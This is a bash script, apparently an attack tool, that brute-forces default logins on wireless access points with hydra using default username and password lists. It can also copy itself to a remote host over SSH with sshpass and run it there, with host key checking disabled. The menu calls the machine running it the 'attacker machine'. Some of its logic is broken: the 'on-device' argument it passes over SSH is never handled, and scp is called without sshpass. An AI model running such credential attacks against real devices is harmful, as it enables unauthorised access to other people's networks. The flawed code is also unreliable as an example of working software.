#!/usr/bin/env bash
# ap_default_creds.sh
# Adapted with remote-vs-local execution: remote scan vs on-device via SSH
# Usage: ./ ap_default_creds.sh
# Requires appropriate tools depending on mode

function detect_os() {
  case "$(uname -s)" in
    Linux*) echo "linux";;
    Darwin*) echo "darwin";;
    *) echo "unknown";;
  esac
}

function ensure_tool() {
  local t=$1
  if ! command -v "$t" &>/dev/null; then
    echo "[!] $t not found, attempting install"
    if [[ "$(detect_os)" == "darwin" ]]; then
      brew install "$t"
    elif [[ "$(detect_os)" == "linux" ]]; then
      sudo apt-get update && sudo apt-get install -y "$t"
    else
      echo "Unsupported OS for install: $t"; exit 1
    fi
  fi
}

function remote_scan() {
  read -rp "AP IP: " TARGET
hydra -L default_users.txt -P default_pass.txt "$TARGET" http-get-form "/login:username=^USER^&pwd=^PASS^:F=failed" -o ap_creds.txt

}

function remote_ssh_execute() {
  local host="$SSH_HOST"
  local user="$SSH_USER"
  local pass="$SSH_PASS"
  echo "[*] Copying script and executing on-device via SSH"
  scp "$0" "$user@$host:/tmp/ap_default_creds.sh"
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/ap_default_creds.sh on-device"
}

# Main
echo "Select mode:"
echo "1) Remote scan from attacker machine"
echo "2) Run on-device via SSH"
read -rp "Choice [1/2]: " MODE

if [[ "$MODE" == "2" ]]; then
  read -rp "SSH host: " SSH_HOST
  read -rp "SSH user: " SSH_USER
  read -rsp "SSH password: " SSH_PASS
  echo
  ensure_tool sshpass
  remote_ssh_execute
  exit 0
else
  # perform remote scan
  ensure_tool hydra
  remote_scan
  exit 0
fi
